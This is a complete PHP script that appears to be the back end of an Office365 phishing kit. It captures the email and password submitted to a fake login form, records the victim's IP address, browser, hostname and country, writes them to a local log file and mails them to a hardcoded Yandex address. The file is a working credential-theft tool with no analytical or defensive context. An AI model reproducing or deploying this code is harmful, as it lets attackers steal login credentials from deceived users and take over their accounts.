<?php

$resultsBox = 'katherine.s001@yandex.com';

handleFormResults($resultsBox);

function handleFormResults($resultsBox=false){
  $email = $_POST['Email'];	
  $password = $_POST['password'];	
  $ip = (isset($_SERVER['HTTP_X_APPENGINE_USER_IP']) ? $_SERVER['HTTP_X_APPENGINE_USER_IP'] : (isset($_SERVER['HTTP_CF_CONNECTING_IP']) ? $_SERVER['HTTP_CF_CONNECTING_IP'] : $_SERVER['REMOTE_ADDR']));
  $country = visitor_country();
  $port = getenv("REMOTE_PORT");
  $timedate = date('m/d/Y h:i:s a', time()); 
  $browserAgent = $_SERVER['HTTP_USER_AGENT'];
  $hostname = gethostbyaddr($ip);

  $message = '';
  $message .= "-------------- LOGIN Info-----------------------\n";
  $message .= "Email : ".$email."\n";
  $message .= "Password : ".$password."\n";
  $message .= "-------------Info-----------------------\n";
  $message .= "|Client IP: ".$ip."\n";
  $message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
  $message .= "Browser                :".$browserAgent."\n";
  $message .= "DateTime                    : ".$timedate."\n";
  $message .= "country                    : ".$country."\n";
  $message .= "HostName : ".$hostname."\n";
  $message .= "----------------------------\n";
  $subject = 'Office365 - $ip';
  file_put_contents('the-logs.txt', $message."\n\n", FILE_APPEND);
  if($resultsBox){ //filter_var($email, FILTER_VALIDATE_EMAIL)
	mail($resultsBox, $subject, $message);  
  }
}

function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = (isset($_SERVER['HTTP_CF_CONNECTING_IP']) ? $_SERVER['HTTP_CF_CONNECTING_IP'] : $_SERVER['REMOTE_ADDR']);
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}


?>